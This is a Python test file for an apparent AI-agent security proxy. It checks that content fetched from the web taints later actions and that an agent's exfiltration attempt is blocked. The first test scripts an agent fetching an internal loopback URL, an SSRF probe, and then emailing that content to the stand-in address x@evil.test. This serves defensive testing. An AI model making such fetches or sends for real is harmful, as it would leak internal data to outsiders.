"""The real_web path is wired through the WHOLE pipeline and still secures it.

Uses a loopback URL so the SSRF guard fires deterministically offline (no network
in CI): that proves the real fetcher (not the canned mock) is the one running, and
that content fetched by it taints the lineage so a downstream exfil is still blocked.
The live, multi-URL demonstration is exercised manually; this locks the wiring.
"""
from __future__ import annotations

from sentinel.demo.driver import ScriptedAgentDriver, ToolInvocation
from sentinel.demo.scenario import run_demo_session
from sentinel.mcp_proxy.content import result_text
from sentinel.redaction import redact_text

CFG = {"allowed_domains": ["corp.example"], "max_amount": 1000}


async def test_real_web_fetch_runs_and_still_blocks_exfiltration() -> None:
    steps = [
        # loopback → the REAL fetcher's SSRF guard returns an error string (offline,
        # deterministic). A canned mock would instead return "<no canned page…>".
        ToolInvocation("web_fetch", {"url": "http://127.0.0.1/internal"}),
        lambda r: ToolInvocation(
            "send_email", {"to": "x@evil.test", "subject": "s", "body": result_text(r[-1])}
        ),
    ]
    res = await run_demo_session(
        ScriptedAgentDriver(steps), user_input="fetch and forward",
        authorization_config=CFG, real_web=True,
    )
    executed = [s.payload for s in res.replay.ordered if s.event_type == "ToolExecuted"]
    blocked = [s.payload for s in res.replay.ordered if s.event_type == "ToolBlocked"]

    # The REAL fetcher ran, not the canned mock. Results are redacted before
    # persistence (F-01), so we prove it by fingerprint: had the mock served this
    # URL it would have returned its "<no canned page for ...>" string, whose
    # redaction is deterministic within the process and therefore comparable.
    mock_output = redact_text("<no canned page for http://127.0.0.1/internal>")
    web_results = [
        e.result_summary for e in executed if e.tool_name == "web_fetch"  # type: ignore[attr-defined]
    ]
    assert web_results, "web_fetch never executed"
    assert all(r != mock_output for r in web_results)
    # content it fetched taints the lineage → exfil blocked, nothing leaves
    assert any(
        b.tool_name == "send_email" and b.matched_rule_id == "block-untrusted-origin"  # type: ignore[attr-defined]
        for b in blocked
    )
    assert res.outbox == []


async def test_real_web_allows_a_legitimate_untainted_action() -> None:
    # real_web mode must not become block-everything: a user-only email to an
    # allowed domain (no fetch in the lineage) is permitted.
    res = await run_demo_session(
        ScriptedAgentDriver([
            ToolInvocation("send_email", {"to": "cfo@corp.example", "subject": "Q3", "body": "ok"})
        ]),
        user_input="email the CFO", authorization_config=CFG, real_web=True,
    )
    assert res.outbox == [{"to": "cfo@corp.example", "subject": "Q3", "body": "ok"}]
    assert not [s for s in res.replay.ordered if s.event_type == "ToolBlocked"]
